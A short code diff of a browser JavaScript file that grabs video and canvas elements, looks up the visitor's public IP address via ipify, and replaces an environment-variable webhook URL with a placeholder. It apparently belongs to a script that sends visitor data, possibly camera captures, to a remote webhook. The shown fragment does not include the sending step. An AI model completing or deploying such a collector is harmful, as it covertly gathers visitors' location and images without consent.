@@ -1,8 +1,6 @@
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-
-// Vercelの環境変数（クライアントサイド用）
-const webhookUrl = process.env.NEXT_PUBLIC_WEBHOOK_URL;
+const webhookUrl = 'WEBHOOK';
 
 fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
